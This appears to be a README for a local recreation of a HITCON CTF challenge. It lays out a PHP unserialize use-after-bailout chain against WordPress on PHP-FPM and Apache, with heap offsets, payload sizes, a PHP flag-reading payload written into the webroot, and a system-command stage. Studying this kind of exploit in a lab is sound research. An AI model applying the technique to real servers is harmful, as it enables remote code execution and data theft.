# PHP2Shell - full local three-instance recreation

This repo now runs a complete **local 3/3 recreation** of the HITCON challenge shape:

- two fresh Nginx/PHP-FPM/WordPress instances;
- one fresh Apache/mod_php/WordPress instance;
- one different dummy flag from each instance.

This still is not an authentic HITCON solve. The organizer image and live instancer were never available, so the Docker profiles here are pinned local clones and the three flags are deliberately fake.

## What is solved locally

`solve_all.py` builds and destroys each target separately. The two FPM runs start with clean databases, clean WordPress volumes, new workers and different ASLR heap bases. The Apache run uses the stock 150-worker prefork layout and pins 149 workers so A1, B1, A2 and B2 reach the same child.

```text
FPM instance A -> seed -> leak -> R2a -> R2b -> R3 -> flag A
FPM instance B -> seed -> leak -> R2a -> R2b -> R3 -> flag B
Apache instance -> A1 -> B1 leak -> A2 -> B2 -> flag C
```

No exploit stage uses GDB. Docker is used only to build/restart the local labs and to check local FPM worker/session state that would not be available remotely.

## Files

```text
.
├── solve_all.py          # builds all three targets and collects 3/3 flags
├── solve.py              # one complete FPM chain
├── payloads.py           # FPM multipart builders
├── apache/
│   ├── solve.py          # Apache A1/B1/A2/B2 chain
│   └── payloads.py       # Apache payload builders
├── lab/
│   ├── compose.yaml      # one disposable FPM target
│   └── apache/           # disposable Apache/WordPress target
└── evidence/             # sanitized successful local results
```

No third-party Python package is required.

## Full local 3/3 run

Requirements:

- Docker with Compose;
- Python 3.11+;
- around 4 GB free memory for the 150-worker Apache profile;
- loopback ports `18233` and `18322` available; the two FPM instances run sequentially on `18233`.

Run `solve_all.py` inside the same Linux or WSL environment that owns the Docker daemon. The Apache relay connects directly to the container's internal IP.

The offline plan does not start containers or send requests:

```bash
python3 solve_all.py
```

Run the complete local recreation:

```bash
python3 solve_all.py --execute
```

A successful run ends with:

```text
hitcon{local_fpm_instance_a_do_not_submit}
hitcon{local_fpm_instance_b_do_not_submit}
hitcon{local_apache_instance_do_not_submit}
3/3 local dummy flags
```

The runner tears down every container, network and database volume after its profile finishes. Request/response evidence stays under `runs/full-local-*/`.

## Running one FPM instance by itself

### Starting the FPM lab

Requirements:

- Docker with Compose
- Python 3.11+
- around 2 GB free memory
- port `18233` free on loopback

Copy the calibrated loopback environment file. These credentials are only for the disposable Docker database:

```bash
cp lab/.env.example lab/.env
```

Now build the lab and install WordPress:

```bash
docker compose --env-file lab/.env -f lab/compose.yaml up -d --build
python3 lab/install.py --port 18233
```

The Docker build downloads WordPress 6.9.10 and checks this SHA-256 before extracting it:

```text
a1c0dc12e2271c6afaabf329d5af7a976f8d2c8c592773178a5baaeafc2d4f4a
```

The installer also opens the front page and the block-pattern endpoint. I need both requests once before running the exploit because they set up the WordPress heap shape used by the producer.

## Checking the payloads

Running the solver without `--execute` does not send any request. It only builds the important payloads and prints their hashes:

```bash
python3 solve.py
```

The two frozen requests should be:

```text
producer    275210 bytes  c83dd915943c9f6983ca1e0e83a4074354892982ff2afd6d1507f1f4931283f5
tail16      217885 bytes  a2d61c04d21b37ad0eb4055320352ce0aefe80ac9b262b30f96ebd6d6c78119f
```

## Running the exploit

```bash
python3 solve.py --execute --restart-at-start
```

`solve.py` only accepts `127.0.0.1`, `localhost` or `::1`. This code is made for the included disposable lab, not for testing random PHP-FPM servers.

A successful run ends with output similar to this:

```json
{
  "success": true,
  "B": "0x000078ef08200000",
  "r2a_p_offset": "0x8862000",
  "r2b_p_offset": "0x8862000",
  "r3_q_offset": "0x608f00",
  "expected_marker": "hitcon{local_fpm85_dummy_do_not_submit}"
}
```

The request and response bodies are saved in `runs/<sid>/` so I can inspect a failed stage without running everything again. That directory is ignored by Git.

If Python is running on Windows and Docker is inside WSL, pass the Docker command like this:

```powershell
py -3 solve.py --execute --restart-at-start `
  --docker-command "wsl -d <WSL_DISTRO> -u root -- docker"
```

## How the chain works

### 1. Producer and stale state

The producer request contains 884 depth-60 empty uploads and twenty 256-byte POST values. Its size is exactly `275210` bytes.

The request reaches `php_var_unserialize_init()`, publishes `BG(unserialize).data`, then dies on the PHP memory limit before the matching cleanup. FPM handles the bailout and keeps the child alive, so the next request can reuse the stale decoder state.

### 2. Heap leak

The leak request makes WordPress reflect a 291-byte value inside a search URL. The useful layout is:

```text
56 x "Z" | 14 pointers | 56 x "Z" | -16 | NULL | 51 x "Z"
```

I URL-decode the reflected value, check the structure and calculate the 2 MiB heap base with:

```python
B = leaked_pointer & ~0x1fffff
```

### 3. BIG multipart value

The replacement-worker stages use one `102375` byte multipart value called `BIG`. The same value is useful in two places:

- the raw bytes at `+0xa000` replace the stale decoder header;
- the copied value contains the fake entries and destructor data.

These are the offsets measured in this exact lab:

```text
copied BIG value : B + 0x21a018
fake entries F   : B + 0x22c018
fake dtors DT    : B + 0x22d018
progress object P: B + 0x8862000
files handler Q  : B + 0x608f00
```

The fake entries array gives the write I use in all three stages:

```text
F->data[F->used_slots++] = source_zval_pointer
```

For an eight-byte target the index is:

```python
used_slots = (target - (F + 16)) // 8
```

### 4. R2a

R2a writes to `P + 0x50`, which is the type word of the live upload-progress data. After the parser bails out, the saved session becomes:

```text
upload_progress_stockdwatch|i:0;
```

Now there is one scalar root for the next stale decode.

### 5. R2b

R2b writes to `P + 0x48` and points the progress value at `DT + 16`, where I place an empty HashTable. The session then contains two roots:

```text
upload_progress_stockdwatch|i:0;
upload_progress_K2stage0001|a:0:{}
```

Those two roots give two decoder stores in R3.

### 6. R3 and the webroot write

The first two fields of the files session handler are next to each other:

```c
zend_string *last_key;  // Q + 0
zend_string *basedir;   // Q + 8
```

R3 points both fields at strings inside `BIG`:

```text
Q + 0 = DT + 16
Q + 8 = DT + 32
```

The fake `last_key` forces PHP to reopen the session file. The fake `basedir` contains a path such as `/var/www/html/r3-<sid>.php` followed by a NUL byte. PHP appends its normal session suffix, but the filesystem only sees the part before the NUL.

The tracked upload filename is:

```php
<?=readfile('/flag')?>
```

Upload-progress serialization writes that string into the redirected session file. The final GET executes it and returns the dummy flag from the local container.

## Apache chain

The Apache profile uses PHP 8.4.26, WordPress 7.0.7 and the official prefork configuration with 150 workers.

```text
A1: memory bailout leaves the session ID state stale
B1: forged ID returns an 819200-byte cookie leak
A2: another bailout leaves session variables dangling
B2: fake reference -> fake HashTable -> zif_system
```

B1 discloses both `libphp` and the main Zend heap chunk. B2 runs:

```sh
cat /flag >/out/local_flag
```

The selected Apache child normally crashes after the destructor callback, but the command completes first and Apache replaces that child. See [`apache/README.md`](apache/README.md) for the public research source used for the payload geometry.

## Limits

The HTTP response gives me `B`, but it does not give me `P` or `Q`. The two clean FPM runs selected `P-B = 0x8862000` and `0x8662000`; both selected `Q-B = 0x608f00`. These are measured clone offsets, so this is not a portable exploit for arbitrary PHP-FPM installations.

The original stale-unserialize idea and indexed `var_entries` write are not mine. The part I worked out here is this local sequence: the raw/copied `BIG` placement, keeping old-base addresses across natural worker replacements, shaping one then two session roots, and finishing with the `ps_files` webroot write under the 1 MiB POST limit.

The sanitized 3/3 run is in [`evidence/full-local.json`](evidence/full-local.json). Earlier single-profile runs remain in [`evidence/results.json`](evidence/results.json). Every marker is local and fake.

## Stopping the lab

```bash
docker compose --env-file lab/.env -f lab/compose.yaml down -v
```

## References

- <https://github.com/3em0/php2shell>
- <https://github.com/alvarodh5/php2shell>
- `9bie/php2shell`, commit `d6f888ebd3f0e188bb662e16f23747afdf35e42f`

The code in this repository is MIT licensed. PHP, WordPress, Nginx and MariaDB keep their own licenses.
